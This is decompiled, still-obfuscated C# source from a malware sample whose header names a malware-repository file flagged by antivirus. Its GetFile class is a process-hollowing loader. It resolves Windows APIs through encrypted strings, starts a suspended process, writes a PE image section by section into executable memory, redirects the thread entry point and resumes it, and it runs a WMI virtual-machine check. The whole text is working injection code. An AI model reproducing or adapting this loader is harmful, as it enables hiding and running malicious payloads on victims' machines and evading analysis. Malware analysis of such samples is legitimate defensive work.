// Decompiled with JetBrains decompiler
// Type: GetFile
// Assembly: nkricnalAl, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F238D28-5A10-4BC1-8318-2ABF5F2B8ACE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Exploit.MSIL.Certutil.gen-800f0b3cb78a8f0934c09d710a8e42286275cbaa10dbdb1841669f6280f0ab51.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

public static class GetFile
{
  private static GetFile.CorLibTypes SecurityControlPrincipal = GetFile.M_g<GetFile.CorLibTypes>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("uHytRU0doBTD/utQt5ia0w6CiUPdpMN/", "nkricnalAl"));
  private static GetFile.EncodedValueToRawValue Log10 = GetFile.M_g<GetFile.EncodedValueToRawValue>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("C9FUjwiDSkyg8I0/S4vgskr1ujjB7cH/", "nkricnalAl"));
  private static GetFile.Get_SISO639LANGNAME M_defaultAlias = GetFile.M_g<GetFile.Get_SISO639LANGNAME>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("mOv1/19TVAVesTT4hqmbAaVg3EjO2XQ1", "nkricnalAl"));
  private static GetFile.FindExactAssembly FindPosForResource = GetFile.M_g<GetFile.FindExactAssembly>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("DCTSmqVriY+iOicwzFd2MA==", "nkricnalAl"));
  private static GetFile.STATE_FIND_NEXT_FILE TransliteratedFrench = GetFile.M_g<GetFile.STATE_FIND_NEXT_FILE>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("ITs8ZBANuwlQVn4eOHxq9+zWld64OCrR", "nkricnalAl"));
  private static GetFile.CurrentDirectory CreateNewEmpty = GetFile.M_g<GetFile.CurrentDirectory>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("ZjILzLxcBUacnNW1KV3b47bydcU1DxZY", "nkricnalAl"));
  private static GetFile._userCallback Raw = GetFile.M_g<GetFile._userCallback>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("lKcJ2ECADO0QnCEBCIHlFaMU3dumzep+", "nkricnalAl"));
  private static GetFile.RemoveMethod get_PEHeadersOptions = GetFile.M_g<GetFile.RemoveMethod>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("u0+JU/mTFiWS75iTHp1itA==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("xnkc+23FB35AKtrLor0oJQ==", "nkricnalAl"));
  private static GetFile.Runtime BigEndian = GetFile.M_g<GetFile.Runtime>(\u003CModule\u003E.î\u00A2Ô\u000BÞ("anCYl+KcACNnNcT5GE5a3A==", "nkricnalAl"), \u003CModule\u003E.î\u00A2Ô\u000BÞ("qEzsZruSI/uB8XX3cARmCqcprKzwmLt2", "nkricnalAl"));

  public static \u0001 M_g<\u0001>(string _param0_1, string _param1)
  {
    AssemblyBuilder assemblyBuilder = (AssemblyBuilder) \u003CModule\u003E.\u008B\u007D\u008D\u00B1B(\u003CModule\u003E.n\u003Aïv\u00B9(), \u003CModule\u003E.\u00A9\u0007f\u0012l(\u003CModule\u003E.î\u00A2Ô\u000BÞ("IO4iyYMf/Ca/7ygdN06EpGkKZsOhWZMA", "nkricnalAl")), AssemblyBuilderAccess.Run);
    ModuleBuilder moduleBuilder = (ModuleBuilder) \u003CModule\u003E.I\u0011êü\u0040((object) assemblyBuilder, \u003CModule\u003E.î\u00A2Ô\u000BÞ("IO4iyYMf/CbzgVNGkkbSv0nXay/2MX1h", "nkricnalAl"));
    TypeBuilder typeBuilder = (TypeBuilder) \u003CModule\u003E.ñ\u00A6\u002E\u00BCÍ((object) moduleBuilder, "DynamicDllInvokeType", TypeAttributes.Public | TypeAttributes.UnicodeClass);
    // ISSUE: type reference
    MethodInfo methodInfo1 = (MethodInfo) \u003CModule\u003E.nD4o\u0091(\u003CModule\u003E.\u0010\u00A5í\u00A3\u00B1(__typeref (\u0001)), \u003CModule\u003E.î\u00A2Ô\u000BÞ("C9hUUVvpHsc=", "nkricnalAl"));
    Type[] array = ((IEnumerable<ParameterInfo>) \u003CModule\u003E.ó\u00B2\u003Dj\u00A1((object) methodInfo1)).Select<ParameterInfo, Type>((Func<ParameterInfo, Type>) (_param0_2 => (Type) \u003CModule\u003E.á\u0016\u009F\u000E\u008B((object) _param0_2))).ToArray<Type>();
    MethodBuilder methodBuilder = (MethodBuilder) \u003CModule\u003E.y\u002E\u00B2\u0082î((object) typeBuilder, _param1, _param0_1, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, \u003CModule\u003E.\u0083\u0095\u0019X\u00B7((object) methodInfo1), array, CallingConvention.Winapi, CharSet.Ansi);
    \u003CModule\u003E.ÄènÍ\u00A1((object) methodBuilder, \u003CModule\u003E.Ø\u0080Ô\u0097e((object) methodBuilder) | MethodImplAttributes.PreserveSig);
    Type type = (Type) \u003CModule\u003E.\u008A\u0091Gõ\u007E((object) typeBuilder);
    MethodInfo methodInfo2 = (MethodInfo) \u003CModule\u003E.\u0016æåÊØ((object) type, _param1);
    // ISSUE: type reference
    return (\u0001) \u003CModule\u003E.d\u0003äÝ\u0006((Type) \u003CModule\u003E.\u0010\u00A5í\u00A3\u00B1(__typeref (\u0001)), methodInfo2, true);
  }

  public static bool AddressKind(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    for (int index = 1; index <= 5; ++index)
    {
      if (\u003CModule\u003E.òæ\u003F\u0096\u0008(_param0, _param1, _param2, _param3))
        return true;
    }
    return false;
  }

  public static bool GetLocal(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    int lpNumberOfBytesWritten = 0;
    string lpCommandLine = \u003CModule\u003E.ÿÂ\u0014ÚÑ("\"", _param0, "\"");
    GetFile.Set_IsImport startupInfo = new GetFile.Set_IsImport();
    GetFile.BytesUnknown SgdekmeIipc = new GetFile.BytesUnknown();
    // ISSUE: type reference
    startupInfo.ERROR_ENVVAR_NOT_FOUND = \u003CModule\u003E.ÚvÿgX(\u003CModule\u003E.Þ\u0099ï\u008F\u003C((Type) \u003CModule\u003E.\u0010\u00A5í\u00A3\u00B1(__typeref (GetFile.Set_IsImport))));
    try
    {
      if (!\u003CModule\u003E.Ø\u0091\u003CÙ\u00A1(_param1))
        lpCommandLine = \u003CModule\u003E.ÿÂ\u0014ÚÑ(lpCommandLine, " ", _param1);
      if (!GetFile.BigEndian(IntPtr.Zero, _param0, lpCommandLine, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, ref startupInfo, ref SgdekmeIipc))
        throw \u003CModule\u003E.\u008F\u007BÓµ3();
      int num1 = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, 60);
      int num2 = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num1 + 52);
      int[] context = new int[179];
      context[0] = 65538;
      if (\u003CModule\u003E.\u0031\u002D\u0025þ1() != 4)
      {
        int num3 = GetFile.SecurityControlPrincipal(SgdekmeIipc.Get_HasBigStrings, context) ? 1 : 0;
      }
      else
      {
        int num4 = GetFile.Log10(SgdekmeIipc.Get_HasBigStrings, context) ? 1 : 0;
      }
      int num5 = context[41];
      int lpBuffer1 = 0;
      int num6 = GetFile.M_defaultAlias(SgdekmeIipc.ReflectionOnlyType, num5 + 8, lpBuffer1, 4, ref lpNumberOfBytesWritten) ? 1 : 0;
      int dwSize = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num1 + 80);
      int nSize = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num1 + 84);
      bool flag = false;
      int lpBaseAddress = GetFile.FindPosForResource(SgdekmeIipc.ReflectionOnlyType, \u003CModule\u003E.\u00B1\u0026\u0083\u00B9E(num2), (uint) dwSize, 12288U, 64U);
      if (!_param3 && lpBaseAddress == 0)
      {
        flag = true;
        lpBaseAddress = GetFile.FindPosForResource(SgdekmeIipc.ReflectionOnlyType, \u003CModule\u003E.\u00B1\u0026\u0083\u00B9E(0), (uint) dwSize, 12288U, 64U);
      }
      if (lpBaseAddress == 0)
        throw \u003CModule\u003E.\u008F\u007BÓµ3();
      int num7 = GetFile.TransliteratedFrench(SgdekmeIipc.ReflectionOnlyType, lpBaseAddress, _param2, nSize, out lpNumberOfBytesWritten) ? 1 : 0;
      int num8 = num1 + 248;
      short num9 = \u003CModule\u003E.\u0001\u0022tÎy(_param2, num1 + 6);
      int num10 = 0;
      do
      {
        int num11 = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num8 + 12);
        int length = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num8 + 16);
        int num12 = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num8 + 20);
        if (length != 0)
        {
          byte[] lpBuffer2 = new byte[length];
          \u003CModule\u003E.ëàç\u001D\u0024((Array) _param2, num12, (Array) lpBuffer2, 0, lpBuffer2.Length);
          int num13 = GetFile.TransliteratedFrench(SgdekmeIipc.ReflectionOnlyType, lpBaseAddress + num11, lpBuffer2, lpBuffer2.Length, out lpNumberOfBytesWritten) ? 1 : 0;
        }
        num8 += 40;
        ++num10;
      }
      while (num10 <= (int) num9 - 1);
      byte[] lpBuffer3 = \u003CModule\u003E.\u0021\u009Dæm\u00BB(lpBaseAddress);
      int num14 = GetFile.TransliteratedFrench(SgdekmeIipc.ReflectionOnlyType, num5 + 8, lpBuffer3, 4, out lpNumberOfBytesWritten) ? 1 : 0;
      int num15 = \u003CModule\u003E.Ù\u0008\u0095Ö\u007C(_param2, num1 + 40);
      if (flag)
        lpBaseAddress = num2;
      context[44] = lpBaseAddress + num15;
      \u003CModule\u003E.\u00AB\u00A4l\u0089\u0012(500);
      if (\u003CModule\u003E.\u0031\u002D\u0025þ1() != 4)
      {
        int num16 = GetFile.CreateNewEmpty(SgdekmeIipc.Get_HasBigStrings, context) ? 1 : 0;
      }
      else
      {
        int num17 = GetFile.Raw(SgdekmeIipc.Get_HasBigStrings, context) ? 1 : 0;
      }
      int num18 = (int) GetFile.get_PEHeadersOptions(SgdekmeIipc.Get_HasBigStrings);
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = (ManagementObjectCollection.ManagementObjectEnumerator) \u003CModule\u003E.w\u0085Ûwc(\u003CModule\u003E.\u007E\u0082\u00A4É\u003D(\u003CModule\u003E.\u0022õ\u0094\u0087\u00B0("Select * from Win32_ComputerSystem")));
      try
      {
        while (\u003CModule\u003E.\u001EÜ\u00A5\u00A4Ó((object) objectEnumerator))
        {
          ManagementBaseObject managementBaseObject = (ManagementBaseObject) \u003CModule\u003E.\u005E\u0024ÁYR((object) objectEnumerator);
          string str = \u003CModule\u003E.\u002F\u0040ÉÚõ((object) \u003CModule\u003E.ÀD\u0016\u00AE\u0025(\u003CModule\u003E.\u0001\u003D\u000Bø\u0029((object) managementBaseObject, "Manufacturer")));
          if (!\u003CModule\u003E.\u0038z\u0010ÆI((object) str, "microsoft corporation"))
          {
            int num19 = \u003CModule\u003E.\u0038z\u0010ÆI((object) str, "vmware") ? 1 : 0;
          }
        }
      }
      finally
      {
        if (objectEnumerator != null)
          \u003CModule\u003E.\u008C\u00BF\u00A8þè((object) objectEnumerator);
      }
      return true;
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.r\u003BW\u0023í(\u003CModule\u003E.ÀD\u0016\u00AE\u0025((object) ex));
      \u003CModule\u003E.ãê\u00D7\u0021\u00B7(\u003CModule\u003E.\u00BBj\u008A\u00228(\u003CModule\u003E.w\u000DáZ\u005D(SgdekmeIipc.Destination)));
      return false;
    }
  }

  public delegate void GetDeclaringType();

  public delegate double Textpos(int p, byte b, short s);

  public delegate void Get_DynamicMethodArray();

  public delegate double Sizes(int p, byte b, short s);

  public delegate bool CorLibTypes(IntPtr thread, int[] context);

  public delegate bool EncodedValueToRawValue(IntPtr thread, int[] context);

  public delegate bool Get_SISO639LANGNAME(
    IntPtr hProcess,
    int lpBaseAddress,
    int lpBuffer,
    int dwSize,
    ref int lpNumberOfBytesRead);

  public delegate int FindExactAssembly(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  public delegate bool STATE_FIND_NEXT_FILE(
    IntPtr hProcess,
    int lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten);

  public delegate bool CurrentDirectory(IntPtr thread, int[] context);

  public delegate bool _userCallback(IntPtr thread, int[] context);

  public delegate uint RemoveMethod(IntPtr hThread);

  public delegate bool Runtime(
    IntPtr hToken,
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref GetFile.Set_IsImport startupInfo,
    ref GetFile.BytesUnknown SgdekmeIipc);

  public struct BytesUnknown
  {
    public readonly IntPtr ReflectionOnlyType;
    public readonly IntPtr Get_HasBigStrings;
    public readonly uint Destination;
    private readonly uint ParseInt32;
  }

  public struct Set_IsImport
  {
    public uint ERROR_ENVVAR_NOT_FOUND;
    private readonly string Mode;
    private readonly string \u003C\u003E3__name;
    private readonly string _offset;
    private readonly byte[] ProcessorCount;
    private readonly IntPtr _ticks;
    private readonly IntPtr Get_IsMultiDimensional;
    private readonly IntPtr MarshalTypeRef;
    private readonly IntPtr Set_ImportDirectory;
  }
}
